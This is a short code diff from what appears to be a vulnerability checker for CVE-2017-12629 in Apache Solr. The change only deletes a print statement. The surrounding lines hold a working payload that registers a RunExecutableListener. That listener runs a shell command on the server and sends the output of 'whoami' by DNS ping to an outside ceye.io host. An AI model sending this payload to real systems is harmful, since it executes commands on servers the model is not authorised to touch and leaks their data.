@@ -27,7 +27,6 @@ class CVE_2017_12629_BaseVerify:
         self.capta = get_capta()
         #self.config_payload = '''{"add-listener":{"event":"postCommit","name":'%s',"class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping `echo %s`.ip.port.lujuii.ceye.io"]}}''' %(self.capta, self.capta)  
         self.config_payload = '''{"add-listener":{"event":"postCommit","name":"zxlss3","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping `whoami`.ip.port.lujuii.ceye.io"]}}'''
-        print(self.config_payload)
         self.update_payload = '''[{"id":"test"}]'''
 
     def run(self):
